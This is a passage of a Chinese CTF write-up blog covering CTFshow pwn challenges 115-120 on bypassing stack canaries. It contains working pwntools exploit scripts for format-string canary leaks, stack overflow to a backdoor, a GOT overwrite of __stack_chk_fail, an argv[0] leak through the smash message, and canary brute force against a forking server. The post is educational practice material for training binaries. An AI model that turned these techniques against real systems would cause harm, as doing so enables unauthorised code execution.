+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775018887214-4b2be23e-3c00-41ce-be00-b6423797113c.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到内容短的很啊，就是循环往buf写入0x200的内容，而后边还会printf(buf)</p>
+<p>明显存在个格式化字符串的漏洞</p>
+<p>先按照惯例算一下参数位置</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">AAAA.%p %p %p %p %p %p %p %p %p %p<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021208472-ea518ac2-6681-49b3-b4c5-46f49d95969d.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是第五位</p>
+<p>那我们的目标其实蛮明确的吧，就是要去找到Canary的位置，最后绕过检验，直接栈溢出之后改掉，然后逃过Canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021055256-ef1ca4eb-caf5-459e-aa2c-cf1d93e1298d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021092862-8a8abcb9-b5dd-487c-99d6-9c141673bb31.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到，buf在ebp-0xD4，而canary在ebp-0xC</p>
+<p>所以距离为</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">0xD4-0xC = 0xC8<br></code></pre></td></tr></table></figure>
+
+<p>在32位程序中，一个栈帧为4字节，所以中间隔了0xC8&#x2F;4 &#x3D; 50个4字节单位</p>
+<p>刚刚算出来了参数位置是第五位</p>
+<p>所以最后是第55位为栈的地址</p>
+<p>%55$p</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021256441-4599bfeb-0ee5-468f-8ad5-eab2551f1c8b.png" srcset="/img/loading.gif" lazyload></p>
+<p>知道位置了我们就能将其泄露出来了，前边放个abcd之类的标记记录一下，之后直接recv截取即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021864578-eff0a03d-47ff-4640-96c1-9522173de59e.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在直接的后门，直接抓就好了</p>
+<p>backdoor &#x3D; 0x080485A6</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28170)</span><br><span class="hljs-emphasis">backdoor = 0x080485A6</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload1 = b&#x27;abcd&#x27;+b&#x27;%55$p&#x27;</span><br><span class="hljs-emphasis">io.sendline(payload1)</span><br><span class="hljs-emphasis">io.recvuntil(b&#x27;abcd0x&#x27;)</span><br><span class="hljs-emphasis">canary = int(io.recv(8),16)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload2 = b&#x27;a&#x27;*(0xD4-0xC)+p32(canary)+b&#x27;a&#x27;*0xC+p32(backdoor)</span><br><span class="hljs-emphasis">io.sendline(payload2)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<p>总的来说，就是先走到Canary面前，给它自己原来的样子，然后再往后走0xC走到返回地址面前，把backdoor的地址塞进去，我们就返回到那边了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021965328-35f480db-bf45-4c0b-9b38-e02ff6c2e1fb.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功绕过canary栈溢出得到flag</p>
+<h2 id="pwn116"><a href="#pwn116" class="headerlink" title="pwn116"></a>pwn116</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775021993607-b573af85-13d5-45f6-a96f-8e3e4bc373db.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续学习别的绕过姿势</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775022043623-bb7fe75e-902e-4c92-b6da-1036e42966d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续来看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775022068693-b511a088-3892-41c5-a5e1-ff88b90a183d.png" srcset="/img/loading.gif" lazyload></p>
+<p>读两次buf，这中间不是还是格式化字符串漏洞吗，读两次然后检测Canary</p>
+<p>和pwn115的唯一区别就是只能读两次了，下边118甚至只能读一次了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024676159-7ee95b2b-a422-4059-bee2-c974a3db666a.png" srcset="/img/loading.gif" lazyload></p>
+<p>后门也还在backdoor &#x3D; 0x08048586</p>
+<p>先测参数位置吧</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">AAAA.%p %p %p %p %p %p %p %p %p %p<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024729689-5d5d7dc7-e548-436e-a0c8-59288da7c5bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>第7位</p>
+<p>看看栈结构</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024747602-70a5461a-51f2-4425-a734-31eec3e8a6de.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024753933-9f8ddb84-a8c6-49e7-af3b-f211baf8e0db.png" srcset="/img/loading.gif" lazyload></p>
+<p>2C到C</p>
+<p>也就是</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">0x2C-0xC = 0x20<br>0x20/4 = 8<br></code></pre></td></tr></table></figure>
+
+<p>再第七位，也就是8+7&#x3D;15了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28265)</span><br><span class="hljs-emphasis">backdoor = 0x08048586</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload1 = b&#x27;abcd&#x27;+b&#x27;%15$p&#x27;</span><br><span class="hljs-emphasis">io.sendline(payload1)</span><br><span class="hljs-emphasis">io.recvuntil(b&#x27;abcd0x&#x27;)</span><br><span class="hljs-emphasis">canary = int(io.recv(8),16)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload2 = b&#x27;a&#x27;*(0x2C-0xC)+p32(canary)+b&#x27;a&#x27;*0xC+p32(backdoor)</span><br><span class="hljs-emphasis">io.sendline(payload2)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775024994253-3eac06af-dae8-42de-be2c-d2982270d590.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="pwn117"><a href="#pwn117" class="headerlink" title="pwn117"></a>pwn117</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025017515-a2f6460c-dbe2-4b67-b875-b7f8aba49791.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025052042-c7acd07a-0edf-4aaf-ba2d-4e1825a90eb4.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护上没啥变化，但是变成64位了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025088033-f6320fbe-33e9-4443-9555-123fcbdf1db8.png" srcset="/img/loading.gif" lazyload></p>
+<p>上来直接自己读了&#x2F;flag然后放在fd了</p>
+<p>接着又从fd读了0x100个字节到buf</p>
+<p>说是给我们省时间了，当然了，直接给我们放在buf了</p>
+<p>后边是一个gets函数，存在栈溢出</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775025494621-cba0f6f7-9999-40a1-a5c6-e159583e989b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775027303684-cfcdbff5-92e1-4018-b3f1-77e24a4a7418.png" srcset="/img/loading.gif" lazyload></p>
+<p>而最后也存在Canary，这一题如果按正常思路打是打不通的，因为拿不到Canary</p>
+<p>我们仔细看看这个Canary，就是这个__stack_chk_fail</p>
+<p>这边利用栈溢出时我们不需要拿 shell，而是故意继续覆盖，破坏 canary 并进一步改写启动栈上glibc 使用的 <code>__libc_argv[0]</code></p>
+<p>随后我们构造栈溢出，检测到栈被覆盖，程序在返回前触发 <code>__stack_chk_fail</code></p>
+<p>可以看到在旧版 glibc 中，这条报错路径会把 <code>__libc_argv[0]</code> 按字符串打印出来</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">eglibc-2.19/debug/stack<span class="hljs-emphasis">_chk_</span>fail.c<br> <br>void <span class="hljs-strong">__attribute__</span> ((noreturn)) <span class="hljs-strong">__stack<span class="hljs-emphasis">_chk_</span>fail (void)</span><br><span class="hljs-strong">&#123;</span><br><span class="hljs-strong">  __</span>fortify<span class="hljs-emphasis">_fail (&quot;stack smashing detected&quot;);</span><br><span class="hljs-emphasis">&#125;</span><br><span class="hljs-emphasis"> </span><br><span class="hljs-emphasis">void <span class="hljs-strong">__attribute__</span> ((noreturn)) internal_</span>function <span class="hljs-strong">__fortify<span class="hljs-emphasis">_fail (const char *msg)</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">&#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  /* The loop is added only to keep gcc happy.  */</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  while (1)</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    _</span><span class="hljs-emphasis">_libc_</span>message (2, &quot;*** %s **<span class="hljs-emphasis">*: %s terminatedn&quot;,</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">                    msg, __libc_argv[0] ?: &quot;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">unknown</span>&gt;</span></span>&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>因此我们可以把它改成 <code>.bss</code> 段中 <code>buf</code> 的地址 <code>0x6020A0</code>，从而把其中的 flag 当作字符串泄露出来。glibc 后续版本已经修补了这一行为，所以本地新环境未必能复现同样输出。 </p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28271)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">payload=b&quot;a&quot;*504+p64(0x6020A0)</span><br><span class="hljs-emphasis">io.sendline(payload)</span><br><span class="hljs-emphasis">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775030127143-6de0cb91-b639-4e3d-942a-2da24d437c48.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pwn118"><a href="#pwn118" class="headerlink" title="pwn118"></a>pwn118</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031169933-7283d272-17af-4f82-83ef-6bae22c985c9.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031203634-575985f0-3289-4fd6-a502-83fe023c8a0f.png" srcset="/img/loading.gif" lazyload></p>
+<p>32位，开了Canary和NX，但是是No RELRO</p>
+<p>我们打开看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031548650-bb8d6489-c47f-4a9f-aaf8-1da1ac11b03e.png" srcset="/img/loading.gif" lazyload></p>
+<p>有点像pwn115啊，格式化字符串漏洞</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">AAAA.%p %p %p %p %p %p %p %p %p %p<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031640409-edef1d98-03a5-4e67-b136-26493c1630c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>参数位置在第7位</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775031579242-00489c88-3538-406a-8e65-f67f720f35e2.png" srcset="/img/loading.gif" lazyload></p>
+<p>后门也准备好了</p>
+<p>但是这一题和pwn115以及pwn116还是不太一样的，因为这一题只能运用一次格式化字符串了，而我们之前的脚本都是运行两次的，我们必须修改思路</p>
+<p>这边注意到这一题的特性，即No RELRO，我们可以直接劫持修改GOT表的</p>
+<p>既然了解到最后一定会遇到___stack_chk_fail，我们其实可以直接把这个函数改成get_flag这个函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032091125-e406a593-44a7-42da-ae53-37f8c509b3cc.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接利用格式化字符串漏洞改写___stack_chk_fail</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28160)</span><br><span class="hljs-emphasis">elf = ELF(&#x27;./pwn118&#x27;)</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">stack_</span>chk<span class="hljs-emphasis">_fail_</span>local = elf.got[&#x27;<span class="hljs-strong">__stack<span class="hljs-emphasis">_chk_</span>fail&#x27;]</span><br><span class="hljs-strong">get<span class="hljs-emphasis">_flag = elf.sym[&#x27;get_</span>flag&#x27;]</span><br><span class="hljs-strong"></span><br><span class="hljs-strong">payload = fmtstr<span class="hljs-emphasis">_payload(7,&#123;stack_</span>chk<span class="hljs-emphasis">_fail_</span>local:get<span class="hljs-emphasis">_flag&#125;)</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">payload = payload.ljust(0x50,b&#x27;A&#x27;)</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">io.sendline(payload)</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">io.interactive()</span></span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032504798-e5313c07-edba-40cb-9018-ead90324c54a.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="pwn119"><a href="#pwn119" class="headerlink" title="pwn119"></a>pwn119</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032542851-a9b0e334-a840-4040-85df-5daf0b687306.png" srcset="/img/loading.gif" lazyload></p>
+<p>姿势路漫漫</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775032582109-a25523a8-e7ad-4e6c-af9b-1199bfdc07df.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051037998-97094925-ec35-46ba-ae21-647eefae9e04.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边main函数用了一个无限循环的父进程，调用fork来创建子进程</p>
+<p>父进程会返回子进程的PID导致跳过break，在那边wait(0)，直到子进程结束再开始下一次循环</p>
+<p>而子进程则是返回0，break，然后进入ctfshow()函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051200873-47b8d84b-000b-4e81-86c6-2cc63d2ba6d7.png" srcset="/img/loading.gif" lazyload></p>
+<p>ctfshow函数也是很明显的一个Canary栈金丝雀</p>
+<p>这边先是把内存区域s的内容全部设置为0，清除s</p>
+<p>之后让我们往s里边写东西，最后puts出来</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775051281905-25034190-b2d0-4d07-84ed-9f302cb07839.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以直接构造栈溢出来试探Canary的值，之后崩溃就崩溃，反正会再创新的子进程</p>
+<p>我们知道Canary通常是四字节，而且第一字节为了防止泄露一般都是\x00</p>
+<p>所以爆破数量不大，我们尝试爆破，每次走到那边试一下，不对就炸，炸完再试</p>
+<p>因为是同一个进程，canary是一样的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775052892548-2d614bf0-0584-43d0-b0e9-e683af79a03d.png" srcset="/img/loading.gif" lazyload></p>
+<p>爆破就好了，爆破到了后门就在这边了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log<span class="hljs-emphasis">_level=&#x27;debug&#x27;)</span><br><span class="hljs-emphasis">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28171)</span><br><span class="hljs-emphasis">elf = ELF(&#x27;./pwn119&#x27;)</span><br><span class="hljs-emphasis">backdoor = 0x08048636</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">canary = b&#x27;\x00&#x27;</span><br><span class="hljs-emphasis">for _</span> in range(3):<br><span class="hljs-code">    for j in range(256):</span><br><span class="hljs-code">        payload = b&#x27;a&#x27;*(0x70-0xC) + canary + p8(j)</span><br><span class="hljs-code">        io.send(payload)</span><br><span class="hljs-code">        sleep(0.3)</span><br><span class="hljs-code">        if b&quot;stack smashing detected&quot; not in io.recv():</span><br><span class="hljs-code">            canary += p8(j)</span><br><span class="hljs-code">            break</span><br><span class="hljs-code"></span><br>payload = b&#x27;a&#x27;<span class="hljs-emphasis">*(0x70-0xC) + canary + b&#x27;a&#x27;*</span>0xc + p32(backdoor)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>一个个爆，爆到一个加一个爆到一个加一个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053132564-84337813-d0fe-44c3-be45-e4b175072046.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后会返回这个报错的，我们检测不到这个就加，然后慢慢补齐就好了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053704030-2a27e268-9154-4ae8-ab11-4cc632ac353b.png" srcset="/img/loading.gif" lazyload></p>
+<p>爆半天终于好了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053719943-5798946e-40a1-4da8-9129-4c8486cd9423.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="pwn120"><a href="#pwn120" class="headerlink" title="pwn120"></a>pwn120</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053744719-729dc8d2-df00-4c9e-8eaa-4d02ae3597a1.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053813582-49391a7d-2815-4636-a943-113f96d8b459.png" srcset="/img/loading.gif" lazyload></p>
+<p>这题变成Full RELRO了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775053852693-52b3a84b-ad78-479b-8b07-cb2c0c55b4f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>开始玩线程了吗，正好操作系统一天到晚玩这个</p>
+<p>可以看到上来先声明了一个大小为2的线程ID数组，之后说了实际线程存在newthread[0]里边</p>
+<p>而newthread[1]里存的则是栈保护值</p>
+<p>之后开始工作，pthread_create(newthread, 0LL, start, 0LL);</p>
+<p>创一个新线程，入口函数为start，然后不传递参数</p>
+<p>之后一直等这个线程结束</p>
+<p>所以我们去start看看，毕竟入口函数在start</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775055755376-3c0a5ad4-67fd-4d71-b7cd-6c58c09fd32e.png" srcset="/img/loading.gif" lazyload></p>
+<p>每一步都有栈检测</p>
+<p>上来清空s</p>
+<p>之后一直到v2 &#x3D; lenth（），看看这是什么</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775055899029-7ad4bb80-6307-49f7-947b-ce8f34a6f4cd.png" srcset="/img/loading.gif" lazyload></p>
+<p>栈保护开死，然后输入最多8个字符到s，还会把字符串转化为long类型</p>
+<p>如果我们的v2&lt;&#x3D;0x5000，就会进行读取，读取v2个字符到s</p>
+<p>最后返回atol(s)，然后是readn(0LL, s, v2);</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1775056050316-a707f6f2-c86f-48d3-bab0-e3f288379ab9.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个readn也不简单</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTFshow-Pwn入门Bypass安全机制(111-120))</div>
+      <div>https://mei-you-qian.github.io/2026/04/10/Bypass安全机制/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Meiyouqian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/10/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/" title="CTFshow-Pwn入门堆利用-前置基础(135-141)">
+                        <span class="hidden-mobile">CTFshow-Pwn入门堆利用-前置基础(135-141)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
